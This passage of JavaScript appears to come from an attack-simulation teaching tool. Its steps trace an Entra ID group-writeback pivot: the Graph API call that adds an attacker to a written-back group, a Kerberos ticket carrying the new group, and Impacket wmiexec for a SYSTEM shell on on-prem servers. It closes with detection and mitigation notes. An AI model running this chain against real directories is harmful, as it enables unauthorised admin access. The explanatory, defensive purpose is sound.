    logMessage: "Enumerate candidate written-back groups: list cloud security groups in Graph, then confirm writeback state from the Entra admin center or Graph beta where groupWritebackConfiguration is actually exposed. Using v1.0 with writebackConfiguration was inaccurate; the writeback property family is documented under /beta.",
    logType: "msgraph",
    action: () => addTemporaryEdge("hb_attacker", "hb_entra", "http", "Graph group writeback enum"),
  },
  {
    logMessage: "Target identified: cloud security group 'IT-Server-Admins', confirmed as provisioned into on-prem AD. On-prem verification: Get-ADGroup 'IT-Server-Admins' shows it is nested into a server-admin path that grants broad local admin rights.",
    logType: "ldap",
    action: () => addTemporaryEdge("hb_attacker", "hb_dc01", "ldap", "on-prem group ACL check"),
  },
  {
    logMessage: "Attacker compromises Entra (e.g., via PRT theft, token replay, GA from prior attack). Adds attacker-controlled user to cloud group: POST https://graph.microsoft.com/v1.0/groups/{IT-Server-Admins_id}/members/$ref { '@odata.id': 'https://graph.microsoft.com/v1.0/users/{attacker_objectId}' }.",
    logType: "msgraph",
    action: () => addTemporaryEdge("hb_attacker", "hb_entra", "http", "POST /groups/members (add self)"),
  },
  {
    logMessage: "Entra ID: Group membership updated. Audit log: 'Add member to group — IT-Server-Admins'. The sync/provisioning engine then pushes the updated group membership into on-prem AD, where downstream ACLs and nested group paths start honoring it.",
    logType: "sync",
    action: () => addTemporaryEdge("hb_aadconnect", "hb_dc01", "sync", "Group member writeback"),
  },
  {
    logMessage: "DC01 Kerberos: Attacker's next TGT (obtained via PTA or PHS password auth on-prem) has PAC updated with new group SID S-1-5-21-...-1125 (IT-Server-Admins). Group nesting evaluated: IT-Server-Admins → nested in Local Admins → attacker has local admin on all servers in that scope.",
    logType: "kerberos",
    action: () => addTemporaryEdge("hb_attacker", "hb_dc01", "kerberos", "TGT w/ new group PAC"),
  },
  {
    logMessage: "Lateral movement to on-prem servers: attacker uses new group membership to authenticate as local admin. Impacket wmiexec.py CORP/attacker@srv-files01.corp.local → SYSTEM shell. Pivots from cloud identity compromise → on-prem server compromise via group writeback chain.",
    logType: "attack",
    action: () => addTemporaryEdge("hb_attacker", "hb_dc01", "smb", "WMIExec (local admin)"),
  },
  {
    logMessage: "Stealth consideration: cloud group membership changes generate Entra audit events, but on-prem DC security logs only show Kerberos TGT requests with the new PAC — no explicit 'group membership changed' event on DC (group change happened via replication from AADConnect, not direct DC operation). Correlation requires joining Entra Audit logs + DC Kerberos logs.",
    logType: "info",
    action: () => highlightElement("hb_entra"),
  },
  {
    logMessage: "IMPACT: Cloud identity compromise → on-prem server access through supported cloud-to-AD provisioning. The attack surface of on-prem AD now includes whoever can modify those cloud-managed groups. Mitigation: audit written-back groups for on-prem privilege, require approvals for sensitive group changes, and monitor both Entra audit logs and sync exports together.",
    logType: "attack",
    action: () => { addTemporaryEdge("hb_attacker", "hb_dc01", "attack-flow", "Cloud→on-prem pivot"); highlightElement("hb_m365"); },
  },
];
